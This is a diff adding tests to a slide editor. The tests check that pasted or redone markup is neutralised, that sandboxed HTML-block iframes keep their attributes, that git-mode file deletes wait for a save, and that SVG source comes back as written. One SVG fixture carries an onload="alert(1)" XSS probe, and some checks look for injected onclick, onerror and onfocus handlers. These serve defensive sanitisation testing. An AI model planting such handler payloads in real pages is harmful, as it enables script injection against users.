+    expect(serializeSection(section, FRAMES).html).toBe(`<p>target</p>${AUTHORED}`);
+    stop();
+  });
+
+  test('a redo that puts the raw pasted nodes back is held too', () => {
+    const { win, section, insert, stop } = editorPage();
+    insert(AUTHORED, 'historyRedo');
+    for (const el of Array.from(section.querySelectorAll('*'))) {
+      for (const type of ['click', 'error', 'focus']) el.dispatchEvent(new win.Event(type));
+    }
+    expect(win.__spy).toEqual([]);
+    expect(section.querySelector('[onclick], [onerror], [onfocus], form, script')).toBeNull();
+    expect(section.querySelector('iframe')?.hasAttribute('src')).toBe(false);
+    expect(serializeSection(section, FRAMES).html).toBe(`<p>target</p>${AUTHORED}`);
+    stop();
+  });
+
+  test('typing is not touched; only what an insert brought in', () => {
+    const { section, stop, win } = editorPage();
+    const p = section.querySelector('p') as HTMLElement;
+    // Markup this page already held, then plain typing next to it.
+    p.setAttribute(sessionInertName(marker, 'onclick'), 'x');
+    p.dispatchEvent(new win.InputEvent('beforeinput', { inputType: 'insertText', bubbles: true }));
+    p.append('!');
+    p.dispatchEvent(new win.InputEvent('input', { inputType: 'insertText', bubbles: true }));
+    expect(p.getAttribute(sessionInertName(marker, 'onclick'))).toBe('x');
+    expect(p.textContent).toBe('target!');
+    stop();
+  });
+});
+
+test.describe('Apply keeps what it does not set', () => {
+  test("a file: the frame's other attributes and the block's other content stay", () => {
+    const section = shown(
+      htmlBlockMarkup({ id: 'b1', box: BOX, src: 'blocks/ab12cd34.html', rev: REV })
+        .replace('<iframe ', '<iframe title="Demo" loading="lazy" data-note="n" ')
+        .replace('</iframe>', '</iframe><p class="caption">Caption</p>')
+    );
+    const block = section.querySelector('.sl-block') as HTMLElement;
+    const frameBefore = block.querySelector('iframe');
+    setHtmlBlockFile(block, { src: 'games/snake/index.html' }, FRAMES);
+    const frame = block.querySelector('iframe') as HTMLIFrameElement;
+    expect(frame).toBe(frameBefore);
+    expect(frame.getAttribute('title')).toBe('Demo');
+    expect(frame.getAttribute('loading')).toBe('lazy');
+    expect(frame.getAttribute('data-note')).toBe('n');
+    expect(frame.getAttribute('data-cm-src')).toBe('games/snake/index.html');
+    expect(frame.hasAttribute('data-cm-rev')).toBe(false);
+    expect(frame.getAttribute('sandbox')).toBe(HTML_BLOCK_SANDBOX);
+    expect(block.querySelector('p.caption')?.textContent).toBe('Caption');
+    const ser = serializeSection(section, FRAMES).html ?? '';
+    expect(ser).toContain('title="Demo"');
+    expect(ser).toContain('<p class="caption">Caption</p>');
+    expect(ser).not.toMatch(/\ssrc=|srcdoc/);
+  });
+
+  test('a legacy block becomes a file, and back inline, keeping the rest', () => {
+    const section = shown(
+      htmlBlockMarkup({ id: 'b1', box: BOX, source: '<p>old</p>' }).replace(
+        '<iframe ',
+        '<iframe title="Old" '
+      )
+    );
+    const block = section.querySelector('.sl-block') as HTMLElement;
+    setHtmlBlockFile(block, { src: 'blocks/ab12cd34.html', rev: REV }, FRAMES);
+    let frame = block.querySelector('iframe') as HTMLIFrameElement;
+    expect(frame.getAttribute('title')).toBe('Old');
+    expect(frame.hasAttribute('srcdoc')).toBe(false);
+    expect(frame.hasAttribute(LEGACY_SRCDOC_ATTR)).toBe(false);
+    expect(serializeSection(section, FRAMES).html).not.toContain('srcdoc');
+
+    setHtmlBlockInline(block, '<p>new</p>');
+    frame = block.querySelector('iframe') as HTMLIFrameElement;
+    expect(frame.getAttribute('title')).toBe('Old');
+    expect(frame.hasAttribute('data-cm-src')).toBe(false);
+    expect(frame.getAttribute('srcdoc')).toContain('<p>new</p>');
+  });
+
+  test('a block with no frame gets one, after its other content', () => {
+    const section = shown(
+      '<div class="sl-block" data-block-type="html" data-cm-block-id="b2"><div class="sl-block-content"><p>x</p></div></div>'
+    );
+    const block = section.querySelector('.sl-block') as HTMLElement;
+    setHtmlBlockFile(block, { src: 'blocks/ab12cd34.html', rev: REV }, FRAMES);
+    const content = block.querySelector('.sl-block-content') as HTMLElement;
+    expect(Array.from(content.children).map(el => el.localName)).toEqual(['p', 'iframe']);
+  });
+
+  test('a new html block goes on its slide at its first Apply', () => {
+    const toolbar = source('../../app/components/SlideToolbar.tsx');
+    expect(toolbar).toContain('openBlockSource(block, { fresh: true, insertInto: section })');
+    const modal = source('../../app/components/blocks/BlockSourceModal.tsx');
+    expect(modal).toContain('insertInto.appendChild(block)');
+  });
+});
+
+test.describe("the git editor's file deletes wait for the save", () => {
+  const deckOf = (...srcs: string[]) =>
+    holder(
+      srcs
+        .map(src => `<section>${htmlBlockMarkup({ id: 'b1', box: BOX, src, rev: REV })}</section>`)
+        .join('')
+    );
+
+  test('deleted once a save without the block lands; kept or dropped otherwise', () => {
+    const pending = createPendingFileDeletes();
+    pending.add(['blocks/aaaaaaaa.html', 'blocks/bbbbbbbb.html', 'blocks/cccccccc.html']);
+    pending.add(['blocks/aaaaaaaa.html']);
+    expect(pending.list()).toHaveLength(3);
+    const live = deckOf('blocks/cccccccc.html'); // an undo brought c back
+    const saved = deckOf('blocks/bbbbbbbb.html').innerHTML; // a save posted before b went
+    expect(pending.settle(saved, live, doc)).toEqual(['blocks/aaaaaaaa.html']);
+    expect(pending.list()).toEqual(['blocks/bbbbbbbb.html']);
+    // The next save without it deletes it.
+    expect(pending.settle(deckOf().innerHTML, deckOf(), doc)).toEqual(['blocks/bbbbbbbb.html']);
+    expect(pending.list()).toEqual([]);
+  });
+
+  test('discard, reload or conflict drops the queue', () => {
+    const pending = createPendingFileDeletes();
+    pending.add(['blocks/aaaaaaaa.html']);
+    pending.clear();
+    expect(pending.settle('', null, doc)).toEqual([]);
+  });
+
+  test('the route queues in the git editor only, and clears with the edit', () => {
+    const route = source('../../app/routes/$slideId/route.tsx');
+    expect(route).toContain('pendingFileDeletes={collabMode ? null : pendingFileDeletes}');
+    expect(route.match(/pendingFileDeletes\.clear\(\)/g)?.length).toBe(4);
+    expect(route).toContain('pendingFileDeletes.settle(');
+  });
+});
+
+test.describe('the svg source editor opens the drawing as authored', () => {
+  test('what display renamed is restored in the source, the shown drawing untouched', () => {
+    const section = shown(
+      '<div class="sl-block" data-block-type="svg" data-cm-block-id="s1"><div class="sl-block-content">' +
+        '<svg viewBox="0 0 10 10" onload="alert(1)"><circle r="4" data-x="1"></circle></svg>' +
+        '</div></div>'
+    );
+    doc.body.append(section); // on the slide, as in the editor
+    const svg = section.querySelector('svg') as SVGSVGElement;
+    const shownBefore = svg.outerHTML;
+    const text = svgBlockSource(svg);
+    expect(text).not.toContain(marker);
+    expect(text).toContain('onload="alert(1)"');
+    expect(text).toContain('<circle');
+    expect(svg.outerHTML).toBe(shownBefore);
+    section.remove();
+  });
+});
